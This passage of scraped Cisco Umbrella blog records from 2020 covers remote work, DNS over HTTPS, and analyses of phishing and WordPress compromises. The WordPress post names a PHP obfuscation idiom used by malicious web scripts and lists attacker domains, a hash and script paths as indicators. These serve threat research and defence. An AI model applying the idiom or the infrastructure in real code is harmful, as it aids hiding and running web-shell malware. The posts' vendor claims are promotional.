use. Keep healthy snacks around. At the office, we tend to visit the vending machine when cravings hit. Try to make sure your home pantry is full of healthy choices! Take regular breaks. Set a reminder alert in your calendar to get up and move around, even if it’s just to take a walk to refill your water bottle. You can also take your calls during a walk using a mobile device. Challenge yourself to do squats or push-ups while you listen to a recorded meeting! Don’t worry if you get interrupted by a barking dog, a crying baby, or a neighbor’s leaf blower. Know where the mute button is located, and consider using a headset. Schedule downtime in your day. It’s easy for working hours to extend all day long if you are telecommuting. Make sure to block time on your calendar for important things like workouts, family dinners, and relaxation. Check in regularly with your manager and your teammates, either on the phone, on a video call, or through instant messages. When we work from home, we often miss the casual conversations about topics unrelated to our jobs. Make a point to reach out and say hello and ask how someone is doing — and then listen! Make time for self-care. This doesn’t have to be a spa day or a glass of wine. At Cisco, we have a Webex collaboration space dedicated to sharing pictures of our pet coworkers at home. We even hosted an All-Paws meeting over Webex! It’s mostly dogs and cats, but there are some birds, rabbits, ferrets, and reptiles, too. Sharing pet photos helps us feel connected to our colleagues, and just a few minutes of scrolling through cute animals can reduce your stress level instantly. Remote Security: From the Office to Your Kitchen Table Of course, there’s one more big challenge to deal with when working from home — keeping our corporate devices and data safe from cybercriminals. Cyber threats are nothing new, but conventional security defenses weren’t designed to enable remote security for users working from home. Security appliances were designed to secure devices that are being used within the office walls. That means those defenses weren’t built for today’s expanded network perimeter — which extends all the way from the data center to your kitchen table. Remote security requires a different approach to protect company devices and data from malicious attacks. Luckily, there’s an easy way to stay protected against threats, instead of making it another full time job. By deploying DNS-layer security, IT teams can keep users working from home safe from opportunistic cyber threats, quickly and easily, on all of their devices — even when they aren’t connected to the VPN. You can learn more about how DNS-layer security works in our previous blog post. Most people set up their home networks for the first time and leave their DNS resolution up to their ISP.  But this leads to a major security blind spot. Cybercriminals are eager to take advantage of vulnerable devices by executing malware attacks, and 91% of malware uses DNS to gain command and control, exfiltrate data, or redirect web traffic. Remote Protection From Cyber Threats Cisco Umbrella delivers security for remote workers as part of its recursive DNS service, which checks for and blocks malicious or inappropriate domains and IPs. By enforcing security at the DNS and IP layers, Umbrella blocks requests to malware, ransomware, phishing, and botnets before a connection is even established. This means stopping attacks before they start. And since it doesn’t add any latency, Umbrella helps you stay productive on the job without compromising your protection when you’re working from home. The last thing you need when trying to manage a challenging work from home situation is a slow internet connection or a malware attack. With Cisco Umbrella, you can connect to the internet with confidence on any device, from anywhere, with easy protection from cyber threats. We’re committed to delivering the best, most reliable, and fastest internet experience to every single one of our users. The Umbrella global network processes 200 billion internet requests from over 100 million users across 190 countries worldwide. To make sense of all that data, we’ve developed highly specialized models that block 7 million malicious destinations at any given time — and detect them before any other security provider on the planet. Your to-do list might feel endless, but staying safe from cyber threats doesn’t have to be frustrating. Sign up for a free trial of Cisco Umbrella and leave the security to us. Tune in next Tuesday for the next article in our #CyberSelfCare series. Interested in our remote security protection? Take advantage of our Free Trial offer !", "date": "2020-04-14"},
{"website": "Cisco-Umbrella", "title": "#CyberSelfCare: Reinvest Your Commute Time with Cybersecurity Training and Education", "author": ["Lorraine Bellon"], "link": "https://umbrella.cisco.com/blog/cyberselfcare-reinvest-your-commute-time-with-cybersecurity-training-and-education", "abstract": "This is the second article in our set of #CyberSelfCare blogs to help you educate yourself, your coworkers, family, and friends about how to protect their digital presence. In last week’s blog post, we talked about how to maintain your sanity while working from home. Working from home has a lot of challenges, but it has major benefits, too. When you work from home, your commute time is greatly reduced. Instead of driving your car, riding a train, riding a bike, or walking to the office, all you have to do is turn on your computer and start working. Anyone who has ever had a long commute can appreciate this. For my first job, I commuted on the train to New York City from a small town in the suburbs. Every day, I spent more than 4 hours on my commute — just traveling to and from the office — and this was before the days of WiFi on public transit. Later, I switched to commuting by car, but with unpredictable traffic, it wasn’t much better. It’s not quite that bad everywhere, but anyone who works in a major metropolitan area like San Francisco, London, or Los Angeles will agree – commuting is exhausting and stressful! One of the single biggest benefits of working remotely is spending less time traveling to and from the office. If you’re new to working from home, you might find yourself with more time in your day. How will you spend it? With that time, you can focus on things that you might not otherwise have time to do if you were still commuting. Sure, you can spend that extra time sleeping and watching reality shows, but what about setting a goal to invest some of that extra time in cybersecurity training? In this week’s post, we’ve curated a list of educational resources you can use to learn more about cybersecurity on your own schedule. Read Cybersecurity Blogs You’re already reading our blog, so why not start reading a few more? In these blogs, you get immediate access to some of the best minds in cybersecurity research and threat hunting. Krebs on Security is written by Brian Krebs, a former Washington Post reporter and well-known cybersecurity expert. Schneier on Security is written by Bruce Schneier, a Harvard fellow and internationally renowned cybersecurity guru. Cisco Talos Blog is written by one of the largest commercial threat intelligence teams in the world, made up of world-class researchers, analysts and engineers. Listen to a Security Podcast If you used to have a long commute, you may already listen to podcasts. Podcasts are a great way to stay up to date on a topic that interests you, and are especially good for listening when taking a walk or during a workout. There’s a podcast for everyone, and that includes people interested in security threats. Talos Takes — join Cisco Talos researchers and analysts as they cover everything from breaking news to the latest trends in cybersecurity. Beers with Talos — listen to the security experts from Talos as they dive into topics like emerging threats, hacking, and other security issues over beers. Shhh… we won’t tell anyone if you enjoy an adult beverage while you listen. Security Stories — enjoy an interview-based podcast full of insights from CISOs and featuring unique, strange, and often hilarious stories about leading cybersecurity efforts in an organization. Attend a Live or On-Demand Webinar Our security experts deliver virtual talks on a wide range of topics, with options for technical and non-technical audiences. There are plenty of live and on-demand webinars to choose from, including: 3 steps to secure remote workers and students Why ransomware remains resilient (and what to do about it) Sacrifice is a good little trick: defeating evasive malware Want to listen to a webinar, but don’t have a lot of time? We have the answer for you! Our Dip in the Deep End series of mini-webinars packs a treasure trove of information into 10 short minutes. Check out some of our recent topics: Punycode: awareness and protection Abracadabra of Malwares: Obfuscation How cryptocurrency is changing cybersecurity Read a Cybersecurity Book Maybe you prefer reading a book to listening to a podcast or webinar. The Cisco Umbrella team has published a vast library of cybersecurity ebooks for you to read, and they’re short enough to read in one sitting. Ransomware Defense for Dummies 2nd Edition 7 Ways to Take Cybersecurity to New Levels Secure Everywhere: The Power of Integrated Internet, Endpoint, and Email Security Complete a Cyber Ops Certification If you have a lot of spare time and a desire to challenge yourself, consider the new Cisco Certified Cyber Ops Associate certification. This credential is designed to prepare you for associate-level job roles in a security operations center (SOC). The program consists of a training course and exam that cover the foundational skills, processes, and knowledge you need to prevent, detect, analyze, and respond to cybersecurity incidents. At the time of writing this blog post, all Cisco certification exams can be completed online from the comfort of your home. Even if you’re not pursuing a career in cybersecurity operations, a certification is a great option for anyone who wants to do a deeper dive into cybersecurity topics and prove their knowledge to current and future employers. Knowledge is Power At Cisco, we’re always learning, and our researchers are pushing the boundaries of threat research and security best practices. It’s harder than ever to keep up with the constant changes in the network security world. Spending just a few minutes per day on continuing education can make you into the trusted cybersecurity expert at your company!", "date": "2020-04-21"},
{"website": "Cisco-Umbrella", "title": "Discovering pandemic-themed phishing cyberattacks with threat intelligence", "author": ["Chris Riviere"], "link": "https://umbrella.cisco.com/blog/discovering-pandemic-themed-phishing-cyberattacks-with-threat-intelligence", "abstract": "One thing I really enjoy about my job as a Technical Solutions Architect with Cisco is being able to really understand how things work. A few months ago, I was trying to create some new content for my upcoming Cisco Live session. Then a global pandemic started! The current world events presented an interesting opportunity to look a little deeper into some of the phishing campaigns we were observing across some of our security products (specifically, Cisco Email Security and Cisco Umbrella). This blog presents some of those findings and points out how the information tied to these campaigns can be stitched together to tell a story. Our goal was to uncover how attackers create and orchestrate sophisticated campaigns to take advantage of the current pandemic. For instance, according to Umbrella researchers , over 50% of domains with “covid” or “corona” in them were malicious in early April. I find this statistic staggering! Rise in pandemic-related phishing emails I started looking into this issue more closely during the last week of February, while attending the RSA conference in San Francisco. I find it fascinating how quickly some of these campaigns were created and executed. Some of them are very elaborate involving compromising numerous web properties, as well as sending out legitimate-looking emails to thousands of targeted people. Side note: I’d like to extend a huge thanks to the Cisco Talos team for helping me obtain some of this information! Working with the Talos intelligence team, we observed phishing email campaigns with topics that ranged from selling books like “Pandemic Survival – How to Survive the Corona Virus” for $37, to more juicy ads like “Military Source Exposes Shocking Truth About this Deadly Pandemic and the ‘1 Thing’ You Must Do before It’s Too Late.” Other more legitimate-looking phishing emails would supposedly redirect you to information about high-risk places in your city. I found the latter example to be the most intriguing since it didn’t have all the typos we see in many phishing emails and actually had some relevant content to offer, which made them seem more trustworthy at first glance. Let’s take a look at one of these phishing emails below from February 26th. A few things to note here: The email was spoofed to make it look like it was being sent from the Centers for Disease Control (CDC) from the account cdc-covid19@cdc[.]gov — but you couldn’t reply to that address Mostly accurate content, which led to a sense of trust Better language and grammar/punctuation usage than most phishing emails I’ve seen (again, to increase trust) A link that appears to point to cdc.gov but is actually pointing somewhere else (more on that later) Of the handful of emails we examined related to the pandemic, this one stuck out as appearing more legitimate. Let’s take a closer look. Below is a high level visualization of what took place during this campaign. The CDC email was especially tricky because the attackers covered their tracks. Even if you were being cautious and decided to check the email address and the URL (which appeared legitimate), you could still be a victim of an attack. Here’s what actually happened in the course of this attack. User gets the email pictured above and clicks on the “CDC” link Link takes them to http://healinig-yui223[.]com/[parameters] This site redirects the user to a compromised site hosting the Microsoft Outlook Phishing element (below are just the ones we observed with our intel) urbanruraldesign[.]com[.]au/[parameters] schooluniformtrading[.]com[.]au/[parameters] Users are presented with an Outlook login page with their userID pre-populated At first you might be thinking, “ How would this fool a user? ” Imagine if you are a regular user of Microsoft Outlook online. When you clicked what you thought was a link to the CDC website, you were presented with what appeared to be the Outlook login page with your username already filled in. You might simply think “Oh, in order to follow that link, I need to be logged into my email, and I’ve been logged out. So, I’ll just enter my corporate password again.” The rest is history. If you’re like many users, you use those same credentials in other places too — across a wide range of SaaS applications, social media sites, and other websites. Of course, if you’re already following cybersecurity best practices , you won’t be re-using your passwords on multiple sites, you may use a password management solution, and probably have multi-factor authentication in place — but we don’t live in a perfect world. To dig a little deeper into this campaign, consider the visibility that Cisco has in this space. Talos sees 400 billion emails a day and Cisco Umbrella sees over 200 billion DNS queries daily . Taking a deeper dive… Let’s take a look at how we studied the data to observe these patterns. Data from Cisco Umbrella Investigate shows us that the domain that people actually connected to from this email (which looked like cdc.gov but was actually healing-yui223[.]com) had a sudden spike on February 26th. Lo and behold, this was the same date as numerous instances of this phishing attack observed by Talos email intelligence. If you visited this domain directly, you would be taken to a harmless-looking website. However, if you clicked the link in the email with the redirect parameters, you would eventually be redirected to an Outlook phishing page. This site hardly had any traffic until a sudden spike on February 26th, which we were able to observe thanks to Umbrella Investigate. Bear in mind, this data set is just based on Umbrella’s visibility, so the real number of visits is likely much higher. We can also see the geographical distribution of requests made to this domain. Sure enough, the requests are coming predominantly from the U.S. This shows that the cyber attackers targeted users in the U.S. which makes sense for an email claiming to be from the CDC. If people in the U.S. saw an email from the Singapore Ministry of Health (that’s another campaign I wish I had more time to go into) they likely wouldn’t take it seriously. When the user clicks the link, they are redirected to another site which actually hosts the phishing page. Based on our analysis, the majority of traffic went to the sites shown below. Notice that they both have similar traffic patterns as the site that redirected them there. At some point, the URLs from these emails were passed into our sandboxing solution, Cisco Threat Grid . Threat Grid was able to perform additional analysis by playing these URLs out in a sandbox environment and assessing their threat. Let’s look a bit further into the domain urbanruralanddesign[.]com[.]au. We can see some other URLs that were hosted on this domain. Of particular interest is the fact that the first spike appears to be related to a CDC phishing campaign, but then in early March, there is a spike related to a Wells Fargo phishing campaign. We suspect this was likely an unpatched WordPress site that was compromised and used in multiple phishing attacks. This demonstrates the sophistication of the actors. In a matter of days, the attackers were able to orchestrate a phishing campaign that took advantage of the pandemic as a hot topic. This involves sending out thousands of legitimate-appearing targeted emails and compromising a number of web properties, all very rapidly. Only a week later, some of these compromised properties were already being used for a completely different phishing campaign. If you’re interested in obtaining this kind of visibility and protection at the DNS layer, consider signing up for free Cisco Umbrella DNS monitoring . This service gives you fast recursive DNS service with visibility into all of your DNS queries… for free! If you’d like to get more sophisticated threat intelligence, including data from Cisco Talos, sign up for a free trial of Cisco Umbrella, and get content and security blocking, along with much more. Also, you can extend the initial Cisco Umbrella 14-day trial period to 90 days by contacting the Cisco sales team. This offer will be available from now until July 1, 2020. I hope you found this blog post helpful. If you’re interested in learning more about phishing attacks and threat intelligence, I’ll be hosting a session at the virtual Cisco Live event. Sign up for my session there or catch me on Twitter @rivimont .", "date": "2020-04-28"},
{"website": "Cisco-Umbrella", "title": "DoH! What’s all the fuss about DNS over HTTPS?", "author": ["Robbie Grue"], "link": "https://umbrella.cisco.com/blog/doh-whats-all-the-fuss-about-dns-over-https", "abstract": "Cisco Umbrella now supports DoH Not all DNS services are created equally. Some break. Some fail to connect to domain servers. Speeds can vary, and if not kept up-to-date, some DNS services can affect the ability to work efficiently. But with more than a decade of leadership in recursive DNS services (13+ years and counting!) Cisco Umbrella boasts significant advantages when it comes to understanding how both legitimate and non-legitimate parties register domains, provision infrastructure, and route internet traffic. Back in the old days when we were known as OpenDNS, we started with the mission to deliver the most reliable, safest, smartest, and fastest DNS resolution in the world. It was a pretty tall order, but we did it — and we’re still doing it today under our new name, Cisco Umbrella. (Here’s one for the trivia champions: OpenDNS was acquired by Cisco on August 27, 2015.) In fact, TechRadar Pro recognized us as having the best free and public DNS server for 2020. You don’t have to take our word for it — check it out here . But just because we’re the best doesn’t mean we’ll stop innovating. We recently announced support for DNS over HTTPS, commonly referred to as DoH, a standard published by the Internet Engineering Task Force (IETF). Cisco Umbrella offers DNS resolution over an HTTPS endpoint as part of our home and enterprise customer DNS services. Users may now choose to use the DoH endpoint instead of sending DNS queries over plaintext for increased security and privacy. DoH can increase user privacy and security by preventing eavesdropping and manipulation of DNS data by man-in-the-middle attacks . In addition, when DoH is enabled, it ensures that your ISP can’t collect personal information related to your browsing history. It can often improve performance, too. How does it work? DoH works just like a normal DNS request, except that it uses Transmission Control Protocol (TCP) to transmit and receive queries. Both requests take a domain name that a user types into their browser and send a query to a DNS server to learn the numerical IP address of the web server hosting that site. The key difference is that DoH takes the DNS query and sends it to a DoH-compatible DNS server (resolver) via an encrypted HTTPS connection on port 443, rather than plaintext on port 53. DoH prevents third-party observers from sniffing traffic and understanding what DNS queries users have run or what websites users are intending to access. Since the DoH (DNS) request is encrypted, it’s even invisible to cybersecurity software that relies on passive DNS monitoring to block requests to known malicious domains. DoH is a choice, not a requirement So what’s all the fuss about DoH? It all comes down to user privacy. And since privacy is a hot topic, it will continue to be blogged and chatted about wildly. To block or not to block DoH is a personal choice. Mozilla blazed the trail with the Firefox browser, but other vendors like Microsoft and Google recently announced plans to add support for DoH in future releases of Windows and Chrome. Mozilla started enabling DoH by default in version 69 of Firefox, and started rolling it out gradually in September 2019. Cisco Umbrella supports Mozilla’s ‘ use-application-dns.net ‘ canary domain, meaning that Firefox will disable DoH for users of Cisco Umbrella. Because DoH is configured within the application, the DNS servers configured by the operating system are not used. This means that the protection provided by Cisco Umbrella may be bypassed by applications using DoH. But don’t worry… you can block this feature easily with Umbrella, too. Most of our enterprise customers choose not to utilize DoH. It isn’t right for everyone. Protect your Umbrella settings Our team at Cisco Umbrella recommends that companies use enterprise policies to manage DoH on endpoints they control. For detailed help on how to proceed, check out this helpful article, GPO and DoH . To block DoH providers and keep your Umbrella deployment settings follow these simple steps: 1. Navigate to Policies > Content Categories 2. Select your in use category setting. 3. Ensure that “Proxy/Anonymizer” is selected 4. Save. Your users will now remain covered by Umbrella as Firefox gradually rolls out this change to their users. How to disable DoH in Firefox Firefox allows users (via settings) and organizations (via enterprise policies and a canary domain lookup) to disable DoH when it interferes with a preferred policy. For existing Firefox users that are based in the United States, the notification below will display if and when DoH is first enabled, allowing the user to choose not to use DoH and instead continue using their default OS DNS resolver. Reliable, effective protection with Cisco Umbrella Cisco Umbrella is the leading provider of network security and DNS services, enabling the world to connect to the internet with confidence on any device. When connecting directly to the internet, organizations need security that is incredibly reliable and eliminates performance problems for end users. Umbrella is built upon a global cloud infrastructure that has delivered 100% uptime since 2006 and we provide automated failover for simplified deployment and management. By leveraging our extensive peering relationships with the top internet service providers (ISPs), content delivery networks (CDNs), and SaaS platforms, such as O365, Umbrella optimizes the routes between core networks and our cloud hubs, providing superior performance and user satisfaction. Umbrella’s support for DoH is just another demonstration of our commitment to delivering the best, most reliable, and fastest internet experience to more than 100 million enterprise and consumer users (and counting). For more information on DoH, visit our knowledge base .", "date": "2020-05-12"},
{"website": "Cisco-Umbrella", "title": "Inadequate security makes WordPress sites a land of opportunity for hackers", "author": ["Sreenidhi Ramadurgam"], "link": "https://umbrella.cisco.com/blog/inadequate-security-makes-wordpress-sites-a-land-of-opportunity-for-hackers", "abstract": "The famous American robber Willie Sutton was asked once why he robbed banks. His answer was humorous, direct, and revealing: “ Because that’s where the money is. ” For hackers, WordPress sites represent a similar rich vein of opportunity. WordPress is one of the world’s most popular web publishing platforms. Its ease of publishing is popular with smaller businesses and organizations looking to establish a quick and easy presence on the internet. Unfortunately, that same ease lends itself to insecure web practices, such as web platforms that aren’t properly protected, weak passwords, and lack of administrative controls. The latter can also make it easy for increased lateral movement once an initial web server is compromised. This can greatly increase the scale of damage, making WordPress infrastructure very lucrative for hackers. Cisco Umbrella threat researchers have been analyzing attacks on various WordPress sites recently. We found some interesting examples of how attackers are compromising WordPress sites. Let’s look into it. How do attackers compromise a WordPress site? Generally, what we’ve seen are variations of land-and-expand techniques. Hackers seek opportunities to infiltrate weakly protected WordPress sites, identify associated assets through phishing and other subterfuge, and expand their network of compromised assets for further expansion of opportunities to monetize their activities. There are several ways to infiltrate WordPress infrastructure. But, generally, we’ve seen attackers progress by these sorts of actions: Take control of the WordPress site through brute force attacks, trojans inside themes and plug-ins, and exploitation of poorly protected admin controls Host malware Host phishing pages that mimic popular brands to collect more information Host spam pages to create more intelligence-gathering opportunities Most importantly, use the compromised site to attack other WordPress sites How does an attacker find and select a site to attack? An attacker can use systems that are designed to scan the internet for vulnerable WordPress sites and then notify the attacker’s command-and-control server. Another method to discover vulnerable sites for attack is open source domain intelligence. For example, an attacker could find a domain by using Google Dorks . When our researchers examined the compromised machines, they found a lot of malicious PHP scripts and malware. First, an attacker would append the malicious code in the index page. So when a customer visits the WordPress site, it redirects to spam pages — or it may trigger the server to do something else. An example of such spam page redirection follows: This attack type is not new — we have been seeing attacks like this for a while. We also observed cases where malware was hosted on the website. In one case, we found a trojan that made contact with the domain detroidcliper[.]at. This particular domain is a command-and-control server. It receives a lot of queries, with high query volumes reaching a max of 94k queries. We also observed a login panel hosted at this domain, that matches the login panel of Sarwent. Let’s take a closer look at malicious scripts that were hosted on a compromised WordPress site. Most of them are PHP scripts which are obfuscated heavily. The most commonly used obfuscation method is eval(gzuncompress(base64_decode(Endoded_content))); After decoding, we found the following script. This PHP code contains an executable file delivered via Base64 encoding. When the PHP code runs, the executable file executes directly in the memory. Another function in the PHP code also searches for an exploit in order to perform privilege escalation. The remainder of the malicious scripts perform various tasks. Some of these redirect to spam sites, give shell access to attackers, and others are used to attempt to compromise other WordPress sites. Generally, the objectives are to collect more intelligence in search of further opportunities to exploit, and compromise more sites to continue the cycle. A brute force WordPress attack is an ongoing process. On average, a single compromised WordPress site tries to brute force about 2,000 other domains per day. Not every WordPress site will be compromised, but enough WordPress sites have easy-to-guess common passwords to make this type of attack worthwhile. Usually, attackers keep a list of simple passwords and use them to launch a brute force attack on a site. During an analysis of network traffic, we noticed that one of the compromised sites was contacting another domain continuously. The domain was styleofphucet[.]at. Surprisingly, this one also has high query volume. This domain was repeatedly contacted during the same compromise that included network callouts to detroidcliper[.]at. While we were researching more about this attack, we found a domain that was embedded in pages of many compromised domains. We found that it hosted an open directory that was very revealing. Inside the directory, we found almost all of the WordPress domains related to the attacks. We observed that a massive amount of random text was collected and stored by the attacker. After closer analysis, we realized that it may be browser history of victims. Why would an attacker store a random massive list of browser history? Isn’t this strange? We believe that attackers use this browser history to search in various search engines for vulnerable domains using a bot. Any of those domains may become the target. Also, the attackers use the sitemap for the pages they have hosted and let the bots crawl them. This way, when a user searches for a website, they get the pages that are hosted by the attackers instead of what they intended to visit. How can WordPress administrators protect themselves from these kinds of exploits? Whenever a WordPress site is being hosted, the administrator has to make sure that all security requirements are met. So many attacks that are happening today are because of a lack of security controls, use of weak passwords, and because of vulnerable themes and plugins. Here are some best practices to protect WordPress sites: Use a strong password and change it regularly Use adequate access controls Update plugins and themes By taking these types of measures, you can reduce the attack surface so that your site is less likely to be compromised. With Cisco Umbrella, you get instant access to interactive threat intelligence that lets you conduct investigations and uncover attacks before they start. Our recursive DNS servers resolve more than 200 billion requests per day, so we can see the relationships between malware, domains, IPs, and networks across the internet. Our threat analysis learns from internet activity patterns to automatically identify attacker infrastructure being staged for the next threat. Learn more about how predictive intelligence can make a difference in your ability to stop threats by reading our technical paper, The Role of Predictive Intelligence in the Fight Against Cyber Attacks . Check out our recent article on threat intelligence to dive into pandemic-themed phishing attacks and uncover how attackers orchestrate sophisticated campaigns to take advantage of the current pandemic. IOCS Possible Compromised sites: https://github.com/minakushi/Domains Hash: 593b2c9292dc36ab619453bb7d8480f78d5d1e04e811f5f1f8d9b612de771718 Uris: /15hftjsefg.php /wp-ss.php /jtyergd /jtyergd /hoinudh12jshs /qoclekrjs /alekfjwh62jshd.php /xlvkfjehq /bzk7md /l3x7zxz9dsv3rt.php /zzz.php /wp_butt.php /wp_class_datalib.php /runargg.php /shathagg.php /roman.php /wp-less /story2.php", "date": "2020-05-19"},
{"website": "Cisco-Umbrella", "title": "Cybersecurity threats, network complexity, and inefficient tools drive change in 2020", "author": ["Negisa Taymourian"], "link": "https://umbrella.cisco.com/blog/cybersecurity-threats-network-complexity-and-inefficient-tools-drive-change-in-2020", "abstract": "Emerging cybersecurity threats drive IT investments Today’s workplaces are evolving in record time. We continue to see a rise in highly distributed environments, remote offices, mobile users, and (now with a global pandemic) a rapid shift to working from home . The attack surface is evolving and the network must adapt. In March 2020, Enterprise Strategy Group (ESG) conducted a survey of IT and information security professionals. The goal of this survey was simple: get some real answers to tough security questions. What’s driving the shift in network security investments? In this new world, who is responsible for evaluating, purchasing, and managing network security products and services? What’s all the buzz about Elastic Cloud Gateways? Wait — what is an Elastic Cloud Gateway? I’ll talk more about this later, but it’s another new term to express the need to consolidate multiple edge network security controls into a unified solution. In this blog, I’ll explain the highlights from ESG’s Elastic Cloud Gateway report. You’ll learn how shifting to the cloud challenges the notion that you need 50+ security tools and 25 vendors to get your job done. Of course, it’s not surprising that point tools lead to sprawl, and more than half of the survey respondents said that sprawl has caused increased complexity that negatively impacted the business — sounds like a headache to me! The scoop on the survey The research is based on more than 375 responses and examines the impacts that cloud, mobility, and distributed environments have on edge network security strategy. Nearly half (48%) of organizations expect at least 40% of their network security controls to be cloud-delivered within 2 years, up from 25% today. This percentage is even higher among distributed organizations. With 86% of organizations reporting issues arising from managing multiple point tools, consolidating functionality through a cloud-delivered approach is an attractive alternative. Why? It helps them to gain control and protect users more effectively. Threats, network complexity, and inefficient tools are driving change Threats remain the biggest challenge, with 41% reporting an increase in malware volume and sophistication. With more mobile devices, more cloud access, and a sprawl of point tools, it’s hard for organizations to get a handle on threats and respond quickly. Too many alerts, inconsistent policy enforcement, and complex investigations are leading buyers to question whether the cloud can reduce this complexity and provide a more efficient way to secure users. Today’s dynamic threat landscape requires additional capabilities beyond basic URL filtering and malware filtering. 79% of organizations say that DNS-layer security is required or important in an elastic cloud gateway solution. It’s not surprising that 64% believe network security is more difficult than two years ago, and nearly half of all respondents believe securing employee access is also more difficult. But why is it harder? 36% of organizations say that an increase in the number of distributed users with access to the network has made network security more challenging. There are some surprises, though — among the survey respondents who use a secure web gateway (SWG), fewer than 1 in 10 are very satisfied! How can such an established technology be leaving so much room for improvement? Perhaps this is why we’re seeing an increase in demand for an integrated cloud-delivered solution like an Elastic Cloud Gateway. SD-WAN and security are closely linked SD-WAN usage is rising, with 80% of survey respondents reporting that they use SD-WAN extensively or selectively. 38% express a preference to use a security vendor that provides edge network security with native SD-WAN capabilities. The biggest drivers for adoption are improved security, better application performance, and reduced bandwidth demands. When asked why their organizations would seek to procure security and SD-WAN tools from the same vendor, 47% expressed a desire for better operational efficiencies for security and networking teams, followed closely by improved threat prevention and detection. Using a single vendor for security and SD-WAN leads to a strategic partnership where the vendor understands their business, computing environment, and strategic objectives holistically. Efficiency, security, and vendor relationships drive desire for consolidation The market is poised for a transition to cloud-delivered network security solutions. Those organizations that have already shifted to the cloud cite better protection (26%), better performance (24%), and easier deployment and maintenance (22%) as their top drivers. 73% of organizations would consider an Elastic Cloud Gateway architecture across their environment to help consolidate multiple edge network security controls into a unified solution. These solutions need to fulfill the promises of better protection and better performance, as well as reduce the complexity and inefficiencies that exist with today’s on-premise solutions. IT and security teams are looking for better management, increased flexibility, and more control over their network security, all of which will continue to drive changes in the market. Join the upcoming webinar with ESG analyst John Grady to hear his valuable insights on this new report.", "date": "2020-05-26"},
{"website": "Cisco-Umbrella", "title": "How Cisco Umbrella helps our cloud security customers win every day", "author": ["Shannon Kelly"], "link": "https://umbrella.cisco.com/blog/how-cisco-umbrella-helps-our-cloud-security-customers-win-every-day", "abstract": "I’m a Customer Success Manager for Cisco Cloud Security, and I love what I do. Apart from having an amazing title, being a CSM means I work with customers to help them achieve success with Cloud Security, and I manage that process end-to-end. I want to say that we take Customer Success very seriously here at Cisco Cloud Security, except that paints too droll a picture for the kind of organization we are. Our global Success team is not a room full of serious people doing serious things. Connecting customers with what they need to be successful is demanding work, sure. But we’re here because we enjoy being CSMs and because we believe in our product and in our customers. Our Success team and the resources we provide are an essential part of our customers’ experience with Cloud Security– so much so that I wrote this whole blog post about it for you. Customer Success Managers: The Role Ah, to have a role where Success is literally part of your title. It’s pretty awesome. “I get it, Shannon, you like your job. Now tell me what you actually do.” Yes, with pleasure! CSMs unlock doors for our customers. We guide users from onboarding through deployment and beyond, and we do so through digital resources and personal connections. We work hand in hand with our Service Delivery team to make sure all customers are successfully deployed, and we extend our expertise to our smallest mom & pop shop customers via our Success Hub and weekly deployment webinars. Yeah, it’s pretty rad– we go to work and geek out over our ever-developing security solution, and then we get to share what we learn with our customers. So my daily interactions are opportunities to impart really beneficial information and guidance. I get to funnel my natural curiosity about what our product does and how it’s changing into conversations with my customers that teach them, open up possibilities for them, and help them get value out of the things they already have. In the CSM world we call this “optimization” and “driving value” and even “return on investment.” Yes, yes, very pretty words that make for pretty presentations. But it boils down to an ongoing conversation of “Ooh, hey! Did you know that you can…” regardless of how big a customer you are or how long you’ve been with us. Being a CSM is like when you got to show your best friend the Konami code, or when you teach your kids how much better Oreos are when you dip them in milk, or when you show your dad how easy life is when you use talk-to-text… every single day. “Being a CSM is like when you got to show your best friend the Konami code, or when you teach your kids how much better Oreos are when you dip them in milk, or when you show your dad how easy life is when you use talk-to-text… every single day.” Shannon Kelly Customer Success: The Team The CSMs are just one part of our global Customer Success team that spans all of a customer’s post-sales needs. Our Onboarding team makes sure every single customer is connected with the right post-sales resources. The Service Delivery team guides customers through technical aspects of deployment, and their expertise is digitally anchored in our Deployment Hub and our Deployment Documentation for everyone to access. Once customers move out of deployment, they can rely on our world-class Support team for troubleshooting. This incredible group of smarties is dedicated solely to Cloud Security, and some of our organization’s biggest brains live here, as evidenced by the Knowledge Base articles they write for our customers. They wisely remind customers to subscribe to our Announcements and Release Notes for the latest product changes. Our eLearning team expands on all of this, ensuring customers who want to grow their knowledge have access to a dynamic library of intelligence through the same simple access to their Umbrella dashboard. The Digital marketing team hosts webinars to boost customer knowledge on hot security topics and product functionality, and they provide a regular newsletter to keep everyone up-to-date on the latest resources and events. And our Advocacy team rounds out the full customer experience by generating case studies , use case videos, and connecting our enthusiastic customers with one another. Cisco Cloud Security: The Product Obviously I admire this role and our organization, but I’m also here because I drank the Cisco Cloud Security kool-aid. It’s a genuinely special thing to get to work for a product that I really believe in. We’re security at the DNS layer for fast and reliable visibility and protection, we protect users on and off the network, we’re built on unmatched threat intelligence , and we offer a cloud-based proxy for full URL inspection and application controls. Customers have access to a deployment that is tailored specifically to their security and networking needs and really powerful insight into their networks and endpoints. We’re even proven to be the most effective security solution by a third-party test (you know, so it’s not just me gushing here). Cloud Security Customers: Our End Users So we have excellent CSMs, a mature Success organization, and our product is the best. But I truly believe that our customers are the most valuable element in all of this. Yes, it’s my job to connect them with all the resources to make them successful, to always update them on What’s New . But it’s their insight and feedback to us that rounds out our interactions. It’s their use cases and questions that keep us on our toes and help drive the innovation that fuels our solution. It’s their willingness to partner with us in creating something amazing that makes such a special relationship. And yes, we take that relationship and the responsibility of fostering that relationship very seriously. But we are more than serious people. We are many teams working together to take our customers to the next level, because we are excited about what we’ll find there together. Which is pretty much what Customer Success is all about, and why Success at Cisco Cloud Security is such an essential part of our makeup.", "date": "2020-06-10"},
{"website": "Cisco-Umbrella", "title": "What is the difference between authoritative and recursive DNS nameservers?", "author": ["Lorraine Bellon"], "link": "https://umbrella.cisco.com/blog/what-is-the-difference-between-authoritative-and-recursive-dns-nameservers", "abstract": "In today’s blog post, we’ll talk about the difference between authoritative and recursive domain name system (DNS) servers. We’ll explain how these two types of DNS servers form the foundation of the internet and help the world stay connected. What is the domain name system? Every computer on the Internet identifies itself with an “Internet Protocol” or “IP” address, which is a series of numbers — just like a phone number. That means you can contact any of those computers by typing in the website name, or you can type the IP address into your browser address bar. Either method will get you to the same destination. All servers that host websites and apps on the internet have IP addresses, too. Give it a try: the IP address of the Cisco Umbrella website is 67.215.70.40. The domain name system (DNS) is sometimes referred to as the “phone book” of the Internet.  You can connect to our website by typing in the IP address in the address bar of your browser, but it’s much easier to type in umbrella.cisco.com. DNS was invented so that people didn’t need to remember long IP address numbers (like phone numbers) and could look up websites by human-friendly names like umbrella.cisco.com instead. There are too many sites on the Internet for your personal computer to keep a complete list. DNS servers power a website directory service to make things easier for humans. Like phone books, you won’t find one big book that contains every listing for everyone in the world (how many pages would that require? That’s a question 